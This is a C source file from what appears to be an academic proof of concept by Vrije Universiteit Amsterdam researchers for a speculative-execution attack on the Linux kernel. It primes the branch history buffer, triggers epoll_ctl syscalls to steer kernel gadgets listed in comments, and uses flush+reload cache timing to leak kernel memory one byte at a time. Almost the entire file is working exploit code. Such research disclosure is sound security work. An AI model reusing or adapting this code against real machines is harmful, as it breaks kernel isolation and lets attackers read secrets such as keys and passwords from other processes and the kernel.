/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/prctl.h>


#include "flush_and_reload.h"
#include "targets.h"
#include "../../poc-common/common.h"
#include <sys/epoll.h>


extern void fill_bhb(uint8_t *history, uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);

extern void do_only_syscall(uint8_t *history, uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);

extern uint64_t static_fill_bhb_sys(uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);

// ----------------------------------------------------------------------------
// Load chain setup functions
//
// ----------------------------------------------------------------------------


void set_load_chain_simple_touch(struct config * cfg, int number_of_loads) {

    // ------------------------------------------------------------------------
    //    unix_poll
    //    0xffffffff8d41e1e2:  mov    rbx,QWORD PTR [rsi+0x18]
    //    0xffffffff8d41e1e6:  test   rdx,rdx
    //    0xffffffff8d41e1e9:  je     0xffffffff8d41e211
    //    0xffffffff8d41e1eb:  mov    r11,QWORD PTR [rdx]
    //    0xffffffff8d41e1ee:  test   r11,r11
    //    0xffffffff8d41e1f1:  je     0xffffffff8d41e211
    //    0xffffffff8d41e1f3:  add    rsi,0x40
    //    0xffffffff8d41e1f7:  mov    r10d,0x16500c8f
    //    0xffffffff8d41e1fd:  sub    r11,0x10
    //    0xffffffff8d41e201:  nop    DWORD PTR [rax+0x0]
    //    0xffffffff8d41e205:  call   r11

    //  0xffffffff8d501cd4:  movzx  ebx,BYTE PTR [r8+rbx*1]


    memset(cfg->ind_map, 0, 0x100);
    cfg->tfp_arg = 0;
    cfg->gadget_arg_tfp = 0;


    switch (number_of_loads)
    {
    case 1:
        cfg->fr_buf = cfg->ind_map + 0x1000;
        cfg->fr_buf_kern = cfg->ind_map_kern + 0x1000;
        cfg->reload_addr = cfg->fr_buf;

        cfg->gadget_arg_secret_addr = cfg->fr_buf_kern - 0x18;
        cfg->tfp_arg = cfg->ind_map_kern;

        *(uint64_t *)(cfg->ind_map) = 0x60606060606060;

        break;
    case 2:
        cfg->fr_buf = cfg->ind_map + 0x1000;
        cfg->fr_buf_kern = cfg->ind_map_kern + 0x1000;
        cfg->reload_addr = cfg->fr_buf;

        cfg->gadget_arg_secret_addr = cfg->ind_map_kern;
        cfg->tfp_arg = cfg->fr_buf_kern;

        *(uint64_t *)(cfg->ind_map) = 0x60606060606060;

        break;

    case 3:
        cfg->fr_buf = cfg->ind_map + 0x1000;
        cfg->fr_buf_kern = cfg->ind_map_kern + 0x1000;
        cfg->reload_addr = cfg->fr_buf;

        cfg->gadget_arg_secret_addr = cfg->ind_map_kern + 0x10 - 0x18;


        cfg->tfp_arg = cfg->ind_map_kern;;
        *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->tfp_leak_target;

        cfg->gadget_arg_base = cfg->fr_buf_kern;

        *(uint64_t *)(cfg->ind_map + 0x10) = 0x0; // the secret

        break;

    default:
        assert(0);
        break;
    }

    // ------------------------------------------------------------------------

}

void set_load_chain_leak_secret(struct config * cfg)
{
    // ------------------------------------------------------------------------
    //    unix_poll
    //    0xffffffff8d41e1e2:  mov    rbx,QWORD PTR [rsi+0x18]
    //    0xffffffff8d41e1e6:  test   rdx,rdx
    //    0xffffffff8d41e1e9:  je     0xffffffff8d41e211
    //    0xffffffff8d41e1eb:  mov    r11,QWORD PTR [rdx]
    //    0xffffffff8d41e1ee:  test   r11,r11
    //    0xffffffff8d41e1f1:  je     0xffffffff8d41e211
    //    0xffffffff8d41e1f3:  add    rsi,0x40
    //    0xffffffff8d41e1f7:  mov    r10d,0x16500c8f
    //    0xffffffff8d41e1fd:  sub    r11,0x10
    //    0xffffffff8d41e201:  nop    DWORD PTR [rax+0x0]
    //    0xffffffff8d41e205:  call   r11

    //    0xffffffff8d501cd4:  movzx  ebx,BYTE PTR [r8+rbx*1]

    memset(cfg->ind_map, 0, 0x100);

    cfg->fr_buf = cfg->ind_map + 0x1000;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x1000;
    cfg->reload_addr = cfg->fr_buf;

    cfg->tfp_arg = cfg->ind_map_kern;;
    *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->tfp_leak_target;


    cfg->ind_tb_addr = (uint64_t * ) (&cfg->gadget_arg_base);

    cfg->ind_secret_addr = (uint64_t * ) (&cfg->gadget_arg_secret_addr);

    *cfg->ind_tb_addr = (uint64_t)cfg->fr_buf_kern - TB_OFFSET;

}

// ----------------------------------------------------------------------------
// Leak helper functions
//
// ----------------------------------------------------------------------------

struct epoll_event event = {.events=0, .data=0};

static void __attribute__ ((noinline)) trigger_target(struct config * cfg){

    assert(static_fill_bhb_sys(__NR_epoll_ctl, cfg->epoll, EPOLL_CTL_ADD, cfg->fd_sock, (uint64_t) &event) == 0);
    assert(syscall(__NR_epoll_ctl, cfg->epoll, EPOLL_CTL_DEL, cfg->fd_sock, 0) == 0);

}

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {

    uint64_t hits = 0;


    *(volatile uint64_t *)cfg->ind_map;
    *(volatile uint64_t *)(cfg->ind_map + 0x20);



    for(int i=0; i < iterations; i++) {


        if (cfg->pht_cfg) {

            // evict BTB entry

            for (size_t i = 0; i < 2; i++)
            {
                cfg->pht_cfg->jmp_entry(cfg->pht_cfg->history_take);
                cfg->pht_cfg->jmp_entry(cfg->pht_cfg->history_not_take);
            }

            // lets make sure prctl syscall is hot again
            do_only_syscall(0, SYS_prctl, 0, 0, 0, 0);
            do_only_syscall(0, SYS_prctl, 0, 0, 0, 0);

        }


        cpuid();


        asm volatile("clflush (%0)\n"::"r"(cfg->reload_addr));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->ind_map_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->tfp_arg));

        cpuid();


        //ensure target is in the btb

        trigger_target(cfg);
        trigger_target(cfg);

        fill_bhb(cfg->history, SYS_prctl, (uint64_t) cfg->tfp_arg, (uint64_t) cfg->gadget_arg_secret_addr, (uint64_t) cfg->gadget_arg_base, 0); // M_SHOW

        cpuid();


        if(load_time(cfg->reload_addr) < THR) {
            if (ret_on_hit) {
                return 1;
            } else {
                hits++;
            }
        }
    }

    return hits;


}

int leak_byte_forwards(struct config * cfg, uint64_t prefix) {

    uint64_t fr_offset, hits;
    uint64_t prefix_offset = (prefix * STRIDE);

    cfg->reload_addr = cfg->fr_buf;

    for (size_t outer = 0; outer < 10; outer++)
    {
        for (uint64_t byte = 0; byte <= 0xff; byte++) {


            fr_offset = (byte << 56);

            fr_offset = fr_offset * STRIDE;

            *cfg->ind_tb_addr = (uint64_t) (cfg->fr_buf_kern - fr_offset - TB_OFFSET - prefix_offset);

            hits = do_flush_and_reload(cfg, 2, 1);

            if (hits > 0) {
                return (int) byte;
            }
        }

    }

    return -1;

}


// ----------------------------------------------------------------------------
// Leak test functions
//
// ----------------------------------------------------------------------------

#define NLOADS 3
void print_leakage_rate(struct config * cfg, uint64_t iterations) {

    uint64_t hits[NLOADS] = {0};
    cfg->reload_addr = cfg->fr_buf;

    for (int l = 0; l < NLOADS; l++)
    {
        set_load_chain_simple_touch(cfg, (l % NLOADS) + 1);

        hits[l % NLOADS] += do_flush_and_reload(cfg, iterations, 0);

        printf("%5ld %6.2f%% | ", hits[l], ((float) hits[l] / iterations) * 100);
        fflush(stdout);

    }

    printf("\n");

}

